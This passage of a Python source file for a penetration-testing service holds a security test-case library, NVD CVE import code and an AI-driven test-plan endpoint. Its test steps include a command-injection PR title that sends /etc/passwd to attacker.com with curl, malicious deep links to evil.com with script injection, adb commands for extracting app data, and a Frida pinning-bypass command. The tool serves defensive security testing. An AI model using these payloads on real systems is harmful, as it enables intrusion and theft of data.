        "id": "TC-CRY001", "title": "Weak / Predictable Tokens",
        "category": "Cryptography", "severity": "high",
        "description": "Predictable password reset tokens, session IDs, or API keys can be brute-forced.",
        "attack_pattern": "Analyze multiple tokens for patterns indicating weak randomness.",
        "steps": [
            "Generate 10+ password reset tokens and compare (look for sequential patterns, timestamps)",
            "Decode tokens: base64, hex — check if they contain timestamps or user IDs",
            "Test short tokens: 6-8 character alphanumeric = 3.5 billion possibilities, feasible brute-force",
            "Use hashcat or custom script to brute-force short tokens",
            "Test session IDs via Burp's Sequencer for randomness quality",
        ],
        "expected_result": "Tokens must use cryptographically secure random (CSPRNG) with at least 128 bits of entropy.",
        "cwe": "CWE-338", "owasp": "A02:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["crypto", "tokens", "randomness"],
    },
    {
        "id": "TC-CRY002", "title": "Timing Attack on Authentication",
        "category": "Cryptography", "severity": "medium",
        "description": "Non-constant-time string comparison leaks whether a value is partially correct via response time differences.",
        "attack_pattern": "Measure response times for valid vs. invalid inputs across many requests.",
        "steps": [
            "Send 100 requests with invalid API key — measure average response time",
            "Send 100 requests where first N characters match a valid key — compare timing",
            "Statistical analysis: t-test on response times to confirm timing oracle",
            "Applicable to: API key validation, HMAC signature verification, token comparison",
        ],
        "expected_result": "All secret comparisons must use constant-time comparison functions (hmac.compare_digest, crypto.timingSafeEqual).",
        "cwe": "CWE-208", "owasp": "A02:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["timing", "crypto"],
    },

    # ── SUBDOMAIN TAKEOVER ────────────────────────────────────────────────────
    {
        "id": "TC-T001", "title": "Subdomain Takeover",
        "category": "Infrastructure", "severity": "high",
        "description": "DNS records pointing to deprovisioned cloud services allow attackers to serve content under the victim domain.",
        "attack_pattern": "Identify dangling DNS records pointing to unclaimed services.",
        "steps": [
            "Enumerate all subdomains (TC-R001)",
            "Check CNAME targets for unclaimed services (NXDOMAIN, 404, default page)",
            "Test fingerprints: 'There is no app configured' (Heroku), 'NoSuchBucket' (S3), '404 Not Found' (GitHub Pages)",
            "Claim the service under attacker account",
            "Verify: serve custom content and confirm it loads under victim subdomain",
        ],
        "expected_result": "Remove DNS records pointing to deprovisioned services. Monitor subdomains continuously.",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["subdomain-takeover", "dns"]},
        "applicable_to": ["web", "cloud"], "tags": ["subdomain-takeover", "dns"],
    },

    # ── MOBILE ────────────────────────────────────────────────────────────────
    {
        "id": "TC-MOB001", "title": "Insecure Data Storage (Mobile)",
        "category": "Mobile", "severity": "high",
        "description": "Sensitive data stored unencrypted in SharedPreferences, SQLite, or external storage is accessible to other apps or via device backup.",
        "attack_pattern": "Extract and inspect app data storage on a rooted device or via backup.",
        "steps": [
            "Rooted Android: adb shell; cat /data/data/<pkg>/shared_prefs/*.xml",
            "Check SQLite: sqlite3 /data/data/<pkg>/databases/*.db .dump",
            "Check external storage: /sdcard/Android/data/<pkg>/",
            "iOS: use iMazing or Frida to access container directory",
            "Test backup extraction: adb backup -noapk com.<pkg>",
        ],
        "expected_result": "Sensitive data encrypted at rest. No PII or tokens in plaintext storage.",
        "cwe": "CWE-312", "owasp": "M2:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "storage", "android", "ios"],
    },
    {
        "id": "TC-MOB002", "title": "Certificate Pinning Bypass (Mobile)",
        "category": "Mobile", "severity": "medium",
        "description": "Certificate pinning prevents MITM interception of app traffic — bypassing it enables API traffic analysis.",
        "attack_pattern": "Use Frida or apk patching to disable certificate pinning.",
        "steps": [
            "Install app, set up Burp proxy — observe if traffic is intercepted or blocked",
            "Use Frida with SSL Kill Switch 2 script: frida --codeshare nabla-c0d3/ssl-kill-switch2 -U -f <bundle>",
            "Alternatively: apktool d app.apk → patch network security config → rebuild",
            "iOS: use ssl-kill-switch2 Cydia package",
            "Once intercepted, analyze API calls for vulnerabilities",
        ],
        "expected_result": "Certificate pinning should be in place. Use multiple pin backups.",
        "cwe": "CWE-295", "owasp": "M5:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "ssl", "pinning"],
    },
    {
        "id": "TC-MOB003", "title": "Insecure Deep Link Handling",
        "category": "Mobile", "severity": "medium",
        "description": "Deep links handled without input validation allow CSRF-style attacks and data injection via custom URL schemes.",
        "attack_pattern": "Craft malicious deep links targeting vulnerable URI handlers.",
        "steps": [
            "Enumerate app URI schemes from AndroidManifest.xml or Info.plist",
            "Test: myapp://auth/callback?token=attacker_controlled_value",
            "Test open redirect via deep link: myapp://open?url=https://evil.com",
            "Test CSRF via deep link: myapp://transfer?amount=1000&to=attacker",
            "Test JavaScript injection if app uses WebViews: myapp://page?data=<script>alert(1)</script>",
        ],
        "expected_result": "Validate all deep link parameters. Require user confirmation for sensitive actions.",
        "cwe": "CWE-939", "owasp": "M4:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "deep-link"],
    },

    # ── SUPPLY CHAIN ──────────────────────────────────────────────────────────
    {
        "id": "TC-SC001", "title": "CI/CD Pipeline Injection",
        "category": "Supply Chain", "severity": "critical",
        "description": "Unsanitized user input in CI/CD pipeline configurations allows code injection that runs in the build environment with elevated privileges.",
        "attack_pattern": "Inject commands via PR titles, branch names, or environment variables used in pipeline steps.",
        "steps": [
            "Review pipeline config files: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile",
            "Find steps using user-controlled inputs (PR title, branch name, commit message) in shell commands",
            "Test: create PR with title containing: test'; curl https://attacker.com/$(cat /etc/passwd); echo '",
            "Check for exposed secrets in pipeline logs: grep -i 'password\\|secret\\|key' build_log.txt",
            "Test if external PRs can access secrets (should be restricted to internal PRs only)",
        ],
        "expected_result": "Sanitize all user inputs before use in shell commands. Restrict secrets to internal PRs only.",
        "cwe": "CWE-78", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["cicd", "exposure"]},
        "applicable_to": ["web", "cloud"], "tags": ["cicd", "supply-chain", "rce", "critical"],
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# CVE → CWE category mapping (for NVD refresh)
# ─────────────────────────────────────────────────────────────────────────────

CWE_TO_CATEGORY = {
    "CWE-79":  "Web Application",    # XSS
    "CWE-89":  "Web Application",    # SQLi
    "CWE-78":  "Web Application",    # OS Command Injection
    "CWE-22":  "Web Application",    # Path Traversal
    "CWE-918": "Web Application",    # SSRF
    "CWE-611": "Web Application",    # XXE
    "CWE-94":  "Advanced Injection", # Code Injection
    "CWE-93":  "Advanced Injection", # CRLF Injection
    "CWE-352": "Web Application",    # CSRF
    "CWE-601": "Web Application",    # Open Redirect
    "CWE-287": "Authentication",     # Improper Auth
    "CWE-863": "Authentication",     # Authorization Bypass
    "CWE-284": "Infrastructure",     # Access Control
    "CWE-200": "Information Disclosure",
    "CWE-209": "Information Disclosure",
    "CWE-502": "Web Application",    # Insecure Deserialization
    "CWE-434": "File Upload",        # Unrestricted Upload
    "CWE-798": "Reconnaissance",     # Hardcoded Credentials
    "CWE-306": "Authentication",     # Missing Auth
    "CWE-269": "Cloud Security",     # Privilege Escalation
    "CWE-326": "Infrastructure",     # Weak Encryption
    "CWE-338": "Cryptography",       # Weak PRNG
}

CWE_TO_SEVERITY = {
    "CWE-78": "critical", "CWE-89": "critical", "CWE-94": "critical",
    "CWE-918": "critical", "CWE-434": "critical", "CWE-502": "critical",
    "CWE-79": "high", "CWE-22": "high", "CWE-611": "high",
    "CWE-287": "high", "CWE-863": "high", "CWE-284": "high",
    "CWE-601": "medium", "CWE-352": "medium", "CWE-93": "medium",
    "CWE-200": "low", "CWE-209": "low", "CWE-326": "medium",
}


def _cve_to_test_case(cve_data: dict) -> dict | None:
    """Convert an NVD CVE entry to a test case dict."""
    try:
        cve_id = cve_data.get("cve", {}).get("id", "")
        descriptions = cve_data.get("cve", {}).get("descriptions", [])
        description = next((d["value"] for d in descriptions if d["lang"] == "en"), "")
        if not description or len(description) < 20:
            return None

        metrics = cve_data.get("cve", {}).get("metrics", {})
        cvss_v3 = metrics.get("cvssMetricV31", metrics.get("cvssMetricV30", []))
        score = 0.0
        severity = "medium"
        if cvss_v3:
            data = cvss_v3[0].get("cvssData", {})
            score = data.get("baseScore", 0.0)
            severity = data.get("baseSeverity", "MEDIUM").lower()

        weaknesses = cve_data.get("cve", {}).get("weaknesses", [])
        cwe_ids = []
        for w in weaknesses:
            for d in w.get("description", []):
                val = d.get("value", "")
                if val.startswith("CWE-"):
                    cwe_ids.append(val)

        primary_cwe = cwe_ids[0] if cwe_ids else None
        category = CWE_TO_CATEGORY.get(primary_cwe, "Web Application") if primary_cwe else "Web Application"
        if primary_cwe and primary_cwe in CWE_TO_SEVERITY:
            severity = CWE_TO_SEVERITY[primary_cwe]

        # Truncate long descriptions
        short_desc = description[:400] + "..." if len(description) > 400 else description

        # Map CWE to tools
        tools: dict = {}
        if primary_cwe in ("CWE-79", "CWE-89", "CWE-94", "CWE-918"):
            tools["nuclei_tags"] = ["cves"]

        pub_date = cve_data.get("cve", {}).get("published", "")[:10]

        return {
            "id": cve_id,
            "title": f"{cve_id} — {category} Vulnerability",
            "category": category,
            "severity": severity,
            "description": short_desc,
            "attack_pattern": f"Exploit {cve_id} ({primary_cwe or 'N/A'}) affecting vulnerable installations.",
            "steps": [
                f"Identify if target is running an affected version — check {cve_id} vendor advisory",
                "Run: nuclei -u <target> -tags cves to check for known CVE templates",
                f"Manual verification: review {cve_id} PoC from NVD or vendor advisory",
                "Check for patches: verify target has applied the relevant security update",
            ],
            "expected_result": f"Target must be patched against {cve_id}. Confirm fix by re-running CVE check.",
            "cwe": primary_cwe,
            "owasp": None,
            "cvss_score": score,
            "published": pub_date,
            "tools": tools,
            "applicable_to": ["web", "api", "network"],
            "tags": ["cve", "live", cve_id.lower()],
            "source": "NVD",
        }
    except Exception:
        return None


async def _fetch_recent_cves(limit: int = 30) -> list[dict]:
    """Fetch recent critical/high CVEs from NVD API v2."""
    results = []
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {
        "resultsPerPage": limit,
        "cvssV3Severity": "CRITICAL",
        "startIndex": 0,
    }
    try:
        async with httpx.AsyncClient(timeout=20.0) as client:
            resp = await client.get(url, params=params)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("vulnerabilities", []):
                    tc = _cve_to_test_case(item)
                    if tc:
                        results.append(tc)
    except Exception as e:
        logger.warning(f"NVD fetch failed: {e}")

    # Also fetch HIGH severity
    try:
        params["cvssV3Severity"] = "HIGH"
        params["resultsPerPage"] = 20
        async with httpx.AsyncClient(timeout=20.0) as client:
            resp = await client.get(url, params=params)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("vulnerabilities", []):
                    tc = _cve_to_test_case(item)
                    if tc:
                        results.append(tc)
    except Exception as e:
        logger.warning(f"NVD HIGH fetch failed: {e}")

    return results


async def _stream_refresh() -> AsyncGenerator[str, None]:
    def _sse(event: str, data: dict) -> str:
        return f"event: {event}\ndata: {json.dumps(data)}\n\n"

    yield _sse("status", {"message": "Connecting to NVD NIST CVE database...", "progress": 10})

    cves = await _fetch_recent_cves(limit=30)

    yield _sse("status", {"message": f"Fetched {len(cves)} recent CVEs — processing...", "progress": 60})

    await __import__("asyncio").sleep(0)

    # De-duplicate against base library
    base_ids = {tc["id"] for tc in TEST_CASES}
    new_cases = [tc for tc in cves if tc["id"] not in base_ids]

    yield _sse("status", {"message": f"Processed {len(new_cases)} new unique test cases", "progress": 90})

    yield _sse("complete", {
        "total": len(new_cases),
        "items": new_cases,
        "source": "NVD NIST",
        "fetched_at": datetime.now(timezone.utc).isoformat(),
    })


# ─────────────────────────────────────────────────────────────────────────────
# Filtering logic
# ─────────────────────────────────────────────────────────────────────────────

def _filter_test_cases(target_types: list[str], tech_stack: list[str], scope: str | None) -> list[dict]:
    if not target_types:
        return TEST_CASES

    filtered = []
    for tc in TEST_CASES:
        if any(t.lower() in tc.get("applicable_to", []) for t in target_types):
            filtered.append(tc)

    cloud_keywords = {"aws", "gcp", "azure", "cloud", "s3", "lambda", "cloudfront"}
    if any(k in (t.lower() for t in tech_stack) for k in cloud_keywords):
        for tc in TEST_CASES:
            if tc not in filtered and "cloud" in tc.get("applicable_to", []):
                filtered.append(tc)

    mobile_keywords = {"android", "ios", "react native", "flutter", "swift", "kotlin"}
    if any(k in (t.lower() for t in tech_stack) for k in mobile_keywords):
        for tc in TEST_CASES:
            if tc not in filtered and "mobile" in tc.get("applicable_to", []):
                filtered.append(tc)

    return filtered


# ─────────────────────────────────────────────────────────────────────────────
# Request models
# ─────────────────────────────────────────────────────────────────────────────

class StandardRequest(BaseModel):
    target: str | None = None
    target_types: list[str] = []
    tech_stack: list[str] = []
    scope: str | None = None


class AIRequest(BaseModel):
    target: str | None = None
    target_types: list[str] = []
    tech_stack: list[str] = []
    scope: str | None = None
    threat_model: str | None = None


# ─────────────────────────────────────────────────────────────────────────────
# AI generation stream
# ─────────────────────────────────────────────────────────────────────────────

async def _stream_ai_testcases(payload: AIRequest) -> AsyncGenerator[str, None]:
    if not settings.ANTHROPIC_API_KEY:
        yield f"event: error\ndata: {json.dumps({'message': 'ANTHROPIC_API_KEY is not configured'})}\n\n"
        return

    client = anthropic.Anthropic(api_key=settings.ANTHROPIC_API_KEY)

    target_desc  = payload.target or "unspecified target"
    types_desc   = ", ".join(payload.target_types) if payload.target_types else "web application"
    stack_desc   = ", ".join(payload.tech_stack)   if payload.tech_stack   else "unknown stack"
    scope_desc   = payload.scope or "full application"
    threat_model = (f"\n\nTHREAT MODEL:\n{payload.threat_model[:4000]}" if payload.threat_model else "")

    base_categories = list({tc["category"] for tc in TEST_CASES})

    system_prompt = """You are a senior penetration tester generating a customized security test case plan.
Respond with ONLY a valid JSON array — no markdown fences, no explanation.
Each item must match this exact schema:
{"id":"TC-AI-001","title":"string","category":"string","severity":"critical|high|medium|low|info","description":"string","attack_pattern":"string","steps":["step"],"expected_result":"string","cwe":"CWE-XXX or null","owasp":"AXX:2021 or null","tools":{"nuclei_tags":[],"nmap":[],"ffuf_wordlist":""},"applicable_to":["web"],"tags":["tag"]}"""

    user_message = f"""Generate a comprehensive security test plan for:
TARGET: {target_desc}
TARGET TYPES: {types_desc}
TECHNOLOGY STACK: {stack_desc}
SCOPE: {scope_desc}{threat_model}

Categories to cover: {', '.join(base_categories)}

Rules:
1. Generate 30-40 test cases tailored to this specific tech stack
2. Include technology-specific tests (Django debug mode, React DOM XSS, Spring Actuator, etc.)
3. Reference real CVEs or OWASP WSTG test IDs where applicable
4. At least 4 critical severity tests
5. Cover: auth, authz, injection, config, secrets, business logic, and supply chain
6. Tool nuclei_tags must match real nuclei template tags (cves, exposures, misconfig, etc.)
7. Steps must be actionable with specific commands and payloads

Return ONLY the JSON array."""

    try:
        full_text = ""
        yield f"event: start\ndata: {json.dumps({'message': 'Generating AI test cases…'})}\n\n"

        with client.messages.stream(
            model=settings.AI_MODEL,
            max_tokens=8192,
            system=system_prompt,
            messages=[{"role": "user", "content": user_message}],
        ) as stream:
            for chunk in stream.text_stream:
                full_text += chunk
                yield f"event: token\ndata: {json.dumps({'text': chunk})}\n\n"

        text = full_text.strip()
        if text.startswith("```"):
            text = text.split("```")[1]
            if text.startswith("json"):
                text = text[4:]
            text = text.rsplit("```", 1)[0]

        cases = json.loads(text.strip())
        if isinstance(cases, dict) and "items" in cases:
            cases = cases["items"]

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        cases = sorted(cases, key=lambda c: sev_order.get(c.get("severity", "info"), 5))

        yield f"event: complete\ndata: {json.dumps({'total': len(cases), 'items': cases, 'mode': 'ai'})}\n\n"

    except json.JSONDecodeError as e:
        logger.error(f"AI test generator bad JSON: {e}")
        yield f"event: error\ndata: {json.dumps({'message': 'AI returned malformed response. Try again.'})}\n\n"
    except Exception as e:
        logger.error(f"AI test generator failed: {e}")
        yield f"event: error\ndata: {json.dumps({'message': str(e)})}\n\n"


# ─────────────────────────────────────────────────────────────────────────────
# Endpoints
# ─────────────────────────────────────────────────────────────────────────────

@router.post("/standard", summary="Generate test cases (rule-based library)")
async def generate_standard(
    payload: StandardRequest,
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    cases = _filter_test_cases(payload.target_types, payload.tech_stack, payload.scope)
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    cases = sorted(cases, key=lambda c: sev_order.get(c["severity"], 5))
    return {"total": len(cases), "items": cases, "mode": "standard"}


@router.post("/ai", summary="Generate test cases with AI (SSE stream)")
async def generate_ai(
    payload: AIRequest,
    current_user: Annotated[User, Depends(get_current_user)],
) -> StreamingResponse:
    if not settings.ANTHROPIC_API_KEY:
        raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                            detail="AI features require ANTHROPIC_API_KEY")
    return StreamingResponse(
        _stream_ai_testcases(payload),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"},
    )


@router.get("/refresh", summary="Fetch latest CVEs from NVD and convert to test cases (SSE stream)")
async def refresh_from_sources(
    current_user: Annotated[User, Depends(get_current_user)],
) -> StreamingResponse:
    return StreamingResponse(
        _stream_refresh(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"},
    )


@router.get("/library", summary="Get the base test case library stats")
async def library_stats(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    from collections import Counter
    categories = Counter(tc["category"] for tc in TEST_CASES)
    severities = Counter(tc["severity"] for tc in TEST_CASES)
    return {
        "total": len(TEST_CASES),
        "categories": dict(categories),
        "severities": dict(severities),
        "sources": ["OWASP WSTG", "PayloadsAllTheThings", "pentester.land patterns", "NVD CVE"],
    }
